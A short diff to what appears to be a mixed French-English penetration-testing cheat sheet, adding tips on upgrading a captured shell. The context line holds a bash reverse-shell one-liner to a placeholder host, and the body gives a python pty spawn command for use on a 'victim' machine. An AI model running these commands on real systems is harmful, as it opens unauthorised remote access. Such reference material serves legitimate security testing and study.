@@ -57,6 +57,8 @@ bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
 
 ## Upgrade your shell
 
+* First, simply try to execute `/bin/bash`, it has auto-completion & stuff like that
+* If it's not enough, do as follow :
 * Les shells qu'on récupère ainsi sont rarement pratique, ils réagissent mal au tab, n'ont pas d'auto-completion, se ferme avec CTRL-C, etc.
 * Pour récupérer un vrai shell. suivre ces étapes : 
   * Sur la victime, spawn un shell via python \(testé avec python3 si le 2 n'est pas dispo\)`python -c 'import pty; pty.spawn("/bin/bash")'`
